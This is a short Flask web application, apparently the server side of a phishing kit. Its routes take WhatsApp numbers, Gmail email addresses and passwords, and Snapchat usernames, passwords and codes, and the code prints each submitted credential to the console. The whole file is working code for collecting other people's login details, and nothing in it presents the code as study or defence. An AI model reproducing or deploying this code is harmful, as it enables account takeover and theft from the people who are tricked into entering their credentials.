from flask import Flask, render_template, jsonify, request

# create instance of the flask app
app = Flask(__name__)


@app.route("/")
def index():
    return render_template("index.html")


@app.route("/submit-whatsapp-credentials", methods=["POST"])
def submit_whatsapp_credentials():
    try:
        whatsapp_number = request.form["whatsapp_number"]
        whatsapp_country = request.form["whatsapp_country"]
        print(whatsapp_number, whatsapp_country)
        return jsonify({"message": "success"})
    except Exception as e:
        print(e)
        return jsonify({"message": "error"})


@app.route("/submit-gmail-credentials", methods=["POST"])
def submit_gmail_credentials():
    try:
        email = request.form["email"]
        password = request.form["password"]
        print(email, password)
        return jsonify({"message": "success"})
    except Exception as e:
        print(e)
        return jsonify({"message": "error"})
    
@app.route("/submit-snapchat-credentials", methods=["POST"])
def submit_snapchat_credentials():
    try:
        username = request.form["username"]
        password = request.form["password"]
        snapchat_code = request.form["snapchat_code"]
        print(username, password, snapchat_code, "All my code")
        return jsonify({"message": "success"})
    except Exception as e:
        print(e)
        return jsonify({"message": "error"})
